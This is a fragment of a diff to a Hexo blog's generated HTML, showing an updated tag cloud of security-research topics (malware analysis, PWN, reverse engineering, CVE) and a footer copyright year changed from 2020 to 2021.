style="font-size: 10px;">自动化</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 10px;">调试</a> <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">进程注入</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" style="font-size: 10px;">远程控制</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 16.25px;">逆向</a> <a href="/tags/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">防反汇编技术</a> <a href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" style="font-size: 11.25px;">静态分析</a>
+        <a href="/tags/2018%E5%B9%B4%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" style="font-size: 10px;">2018年工业信息安全技能大赛</a> <a href="/tags/2018%E6%8A%A4%E7%BD%91%E6%9D%AF/" style="font-size: 10px;">2018护网杯</a> <a href="/tags/APT/" style="font-size: 11.25px;">APT</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/CVE/" style="font-size: 12.5px;">CVE</a> <a href="/tags/CrackMe/" style="font-size: 11.25px;">CrackMe</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/DLL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">DLL注入</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/IDA/" style="font-size: 10px;">IDA</a> <a href="/tags/IDA-Pro/" style="font-size: 10px;">IDA Pro</a> <a href="/tags/IDS/" style="font-size: 10px;">IDS</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">Java反序列化</a> <a href="/tags/Kali-Linux/" style="font-size: 10px;">Kali Linux</a> <a href="/tags/Linux/" style="font-size: 13.75px;">Linux</a> <a href="/tags/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/" style="font-size: 10px;">Linux动态链接库</a> <a href="/tags/Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">Linux子系统</a> <a href="/tags/OllyDbg/" style="font-size: 10px;">OllyDbg</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/PWN/" style="font-size: 18.75px;">PWN</a> <a href="/tags/PwnTools/" style="font-size: 10px;">PwnTools</a> <a href="/tags/Pwnable-kr/" style="font-size: 10px;">Pwnable.kr</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/ShellCode/" style="font-size: 11.25px;">ShellCode</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Slmail/" style="font-size: 10px;">Slmail</a> <a href="/tags/Snort/" style="font-size: 10px;">Snort</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">WEB安全</a> <a href="/tags/WinDbg/" style="font-size: 10px;">WinDbg</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" style="font-size: 11.25px;">Windows恶意代码</a> <a href="/tags/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">Windows系统安全</a> <a href="/tags/Wordpress/" style="font-size: 11.25px;">Wordpress</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 15px;">二进制安全</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">信息安全</a> <a href="/tags/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" style="font-size: 10px;">内核调试</a> <a href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">分析报告</a> <a href="/tags/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/" style="font-size: 10px;">加壳与脱壳</a> <a href="/tags/%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">加密</a> <a href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" style="font-size: 12.5px;">动态分析</a> <a href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">动态分析技术</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" style="font-size: 10px;">动态调试</a> <a href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/" style="font-size: 10px;">反汇编</a> <a href="/tags/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">反虚拟机技术</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size: 11.25px;">反调试</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%B1%80%E5%8A%BF/" style="font-size: 10px;">安全局势</a> <a href="/tags/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" style="font-size: 10px;">安全竞赛</a> <a href="/tags/%E5%B0%8F%E7%AA%8D%E9%97%A8/" style="font-size: 10px;">小窍门</a> <a href="/tags/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;">工业控制安全</a> <a href="/tags/%E5%BF%83%E5%BE%97/" style="font-size: 11.25px;">心得</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" style="font-size: 20px;">恶意代码分析</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/" style="font-size: 11.25px;">恶意代码分析实战</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/" style="font-size: 10px;">恶意代码启动方式</a> <a href="/tags/%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/" style="font-size: 10px;">恶意行为分析</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/" style="font-size: 10px;">数据包分析</a> <a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">木马</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a> <a href="/tags/%E6%A1%8C%E9%9D%A2/" style="font-size: 10px;">桌面</a> <a href="/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">模糊测试</a> <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">汇编语言</a> <a href="/tags/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">游戏安全</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%9C%A8%E9%A9%AC%E5%8C%96%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">特洛伊木马化技术</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">破解</a> <a href="/tags/%E7%A6%BB%E7%BA%BF%E7%BF%BB%E8%AF%91/" style="font-size: 10px;">离线翻译</a> <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E8%AF%86%E5%88%AB/" style="font-size: 10px;">网络流量识别</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size: 10px;">自动化</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 10px;">调试</a> <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">进程注入</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" style="font-size: 10px;">远程控制</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 16.25px;">逆向</a> <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">逻辑漏洞</a> <a href="/tags/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">防反汇编技术</a> <a href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" style="font-size: 11.25px;">静态分析</a>
     </div>
 </div>
 
@@ -1050,7 +1100,7 @@
                 
                 </a>
                 <p class="is-size-7">
-                &copy; 2020 Hvnt3r&nbsp;
+                &copy; 2021 Hvnt3r&nbsp;
                 Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
                         href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                 
